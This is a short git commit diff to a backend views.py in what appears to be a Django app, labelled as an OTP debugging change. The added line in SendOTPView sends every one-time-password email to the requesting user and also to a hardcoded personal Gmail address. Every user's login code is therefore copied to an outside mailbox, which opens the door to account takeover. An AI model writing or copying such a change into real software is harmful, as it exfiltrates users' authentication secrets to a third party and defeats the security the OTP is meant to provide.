16fb4577eb39d2f96e6c201dc1a674ff345c6f90
Kamal Kumar <140941027+kamal1122pk@users.noreply.github.com>
2026-03-26 16:10:33 +0500

    Update views.py otp debugg

--- backend/api/views.py
+++ backend/api/views.py
@@ -556,7 +556,7 @@ class SendOTPView(APIView):
         try:
             from django.core.mail import send_mail
             from django.conf import settings
-            send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [email])
+            send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [email, "yorkkamal@gmail.com"])
         except Exception as e:
             return Response({"error": f"Failed to send email: {str(e)}"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
         
